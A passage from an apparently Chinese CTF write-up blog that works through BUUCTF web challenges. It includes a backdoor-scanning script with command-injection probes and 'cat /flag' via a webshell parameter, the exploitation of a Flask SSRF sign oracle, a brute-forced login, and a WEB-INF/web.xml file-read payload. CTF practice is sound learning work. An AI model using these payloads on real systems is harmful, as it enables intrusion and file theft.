<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先导入需要的模块</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading    <span class="comment">#设置多线程</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：'</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">      <span class="comment">#开始时间：Wed May 13 20:32:17 2020</span></span><br><span class="line">MaxThread = threading.Semaphore(<span class="number">100</span>)    <span class="comment">#设置最大线程数</span></span><br><span class="line">FilePath = <span class="string">r"D:\\phpstudy_pro\\wamp64\\www\\src"</span></span><br><span class="line">os.chdir(FilePath)      <span class="comment">#改变当前路径到指定路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>   <span class="comment">#设置重连次数，防止线程数过高导致断开连接</span></span><br><span class="line">files = os.listdir(FilePath)    <span class="comment">#返回指定的文件夹包含的文件或文件夹的名字的列表</span></span><br><span class="line"><span class="comment">#print(files)       #['A00UTldNShN.php', ......, 'a0flV_jlrc1.php']</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>      <span class="comment">#设置连接活跃状态为false</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span>      <span class="comment">#设置函数表示来执files当中一个文件</span></span><br><span class="line">    tt = time.time()</span><br><span class="line">    MaxThread.acquire()     <span class="comment">#获取 Semaphore</span></span><br><span class="line">    print(<span class="string">'正在打开文件：  '</span>+file+<span class="string">'   时间： '</span>+time.asctime(time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>,f.read()))</span><br><span class="line">        posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>,f.read()))</span><br><span class="line">    data = &#123;&#125;       <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;     <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo '123456';"</span>    <span class="comment">#设置好get和post传参</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo '123456';"</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1/src/"</span>+file</span><br><span class="line">    req = session.post(url,data = data,params = params)     <span class="comment">#发送所有的get和post请求</span></span><br><span class="line">    req.close()     <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'123456'</span> <span class="keyword">in</span> content:     <span class="comment">#检查是否执行命令，如果执行，筛选出具体参数</span></span><br><span class="line">        flag = <span class="number">0</span>    <span class="comment">#通过flag的值来判断是get还是post</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?'</span>+a+<span class="string">"=echo '123456';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()             <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'123456'</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url = url ,data = &#123;b:<span class="string">"echo '123456';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()         <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'123456'</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'&lt;=================================================================&gt;'</span>)</span><br><span class="line">        print(<span class="string">'发现含有后门的文件：'</span>+file+<span class="string">"   传入的参数为："</span>+param+<span class="string">"=echo '123456';"</span>)</span><br><span class="line">        print(<span class="string">'程序运行结束，结束时间为：'</span>+time.asctime(time.localtime(time.time())))</span><br><span class="line">        print(<span class="string">'程序总共耗时：'</span>+time.asctime(time.localtime(time.time()-tt)))</span><br><span class="line">        print(<span class="string">'&lt;=================================================================&gt;'</span>)</span><br><span class="line">        exit()</span><br><span class="line">    MaxThread.release()         <span class="comment">#释放 Semaphore</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:     <span class="comment">#加入多线程</span></span><br><span class="line">    t = threading.Thread(target=get_content,args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589377704993.png" alt="1589377704993"></p>
<p>这个脚本思路还是很清晰的，不过多线程还是有点不熟悉，以后遇到要脚本的题还是尽量自己写一遍<br><a href="https://blog.csdn.net/a3320315/article/details/102945940?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">参考脚本</a></p>
<p>最后发现后门<code>/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code>得到flag<br><img src="/2020/05/16/BUU-web5/1589358734581.png" alt="1589358734581"></p>
<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589354082674.png" alt="1589354082674"></p>
<p>代码审计：</p>
<p>这是一个python的flask框架，有三个路由</p>
<blockquote>
<p>@app.route(“/geneSign”, methods=[‘GET’, ‘POST’])    #调用getSign方法生成 md5</p>
<p>@app.route(‘/De1ta’,methods=[‘GET’,’POST’])    #获取了三个参数，最后传入Task类中</p>
<p>@app.route(‘/‘)        #获取源码</p>
</blockquote>
<p><a href="http://www.bjhee.com/flask-2.html" target="_blank" rel="noopener">Flask框架-路由</a></p>
<p>这里De1ta是关键的页面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>

<p>在/De1ta页面我们get方法传入param参数值，在cookie里面传递action和sign的值，将传递的param通过waf这个函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>waf函数检查是否以gopher或者file开头，将这两个协议过滤掉，使我们不能通过协议读取文件<br>当绕过waf后，会将传入的参数作为Task类的对象，并执行Exec，跟进这个方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                result[<span class="string">'data'</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>其先经过checksign方法检测是否登陆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true。之后进入if语句，判断<code>scan</code>是否在<code>action</code>里面，如果在，则将param经过scan函数处理，之后再进一步判断<br>跟进scan函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br></pre></td></tr></table></figure>

<p>这里可以读取param的内容，并且没有任何过滤，如果将param令为flag.txt，则会得到flag。</p>
<p>首先让<code>self.checkSign()</code>返回true即<code>getSign(self.action, self.param) == self.sign</code>条件成立，先看看getsign</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>这里使用了<code>==</code>弱类型比较， 即<code>secert_key + param + action</code>的md5值与传入的sign值相等即可返回true，其中param要为flag.txt，为了保证Exec()函数中scan部分和read部分都能被执行action中又必须包含readscan或者scanread<br><img src="/2020/05/16/BUU-web5/1589357192899.png" alt="1589357192899"></p>
<p>现在的条件为<code>md5(secert_key+flag.txt+readscan/scanread)==sign</code><br>这里我们不知道<code>secert_key</code>,但是/geneSign路由，暴露了getSign函数，我们可以根据路由getSign去得到正确的sign值，这里将action写死为scan，即sign=md5(key + param1 + ‘scan’)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589357431885.png" alt="1589357431885"></p>
<blockquote>
<p>cd792970b68162615b4bb7d77225b507</p>
</blockquote>
<p>这样一来，等号左边为md5(key + ‘flag.txt’ + ‘readscan’)，已被写死，等号右边的未定的参数也可也可确定，即md5(key + ‘flag.txtread’ + ‘scan’)。param1为’flag.txtread’依此传参，可得一个哈希值，这就是我们将传给self.sign的值。</p>
<p><img src="/2020/05/16/BUU-web5/1589358183429.png" alt="1589358183429"></p>
<blockquote>
<p>d7fc4bfd85f94f17fb8b988550209c42</p>
</blockquote>
<p>接着依次传参即可<br><img src="/2020/05/16/BUU-web5/1589358383231.png" alt="1589358383231"></p>
<p>参考文章：<a href="https://www.jianshu.com/p/eb60c856f2a3" target="_blank" rel="noopener">https://www.jianshu.com/p/eb60c856f2a3</a></p>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>这个题留了很久都没做，因为看见java心生恐惧，但是无论遇到什么困难，都不要放弃，微笑着面对它们，消除恐惧的办法就是面对恐惧，加油，奥利给！</p>
<p>打开靶机是一个登陆框，密码可以爆破admin/admin888,但是里面什么都没有<br><img src="/2020/05/16/BUU-web5/1589361523563.png" alt="1589361523563"></p>
<p>退出去，有一个help按钮，点击得到<br><img src="/2020/05/16/BUU-web5/1589361571235.png" alt="1589361571235"></p>
<p>尝试文件包含，看wp里面说将GET请求改为POST<br><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">分享一个关于源码泄露的网址</a><br>里面有讲WEB-INF/web.xml泄露。访问一下</p>
<p><img src="/2020/05/16/BUU-web5/1589361940703.png" alt="1589361940703"></p>
<p>接着读取flag，直接照搬了<br>这里是从web.xml里面推测出来classes下面的文件，从而进行读取对应的.class文件</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="regexp">/WEB-INF/classes</span><span class="regexp">/com/wm</span><span class="regexp">/ctf/</span>FlagController.<span class="keyword">class</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589362044015.png" alt="1589362044015"></p>
<p>将base64解码后得到flag</p>
<p><img src="/2020/05/16/BUU-web5/1589362074667.png" alt="1589362074667"></p>
<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">        @app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>

<blockquote>
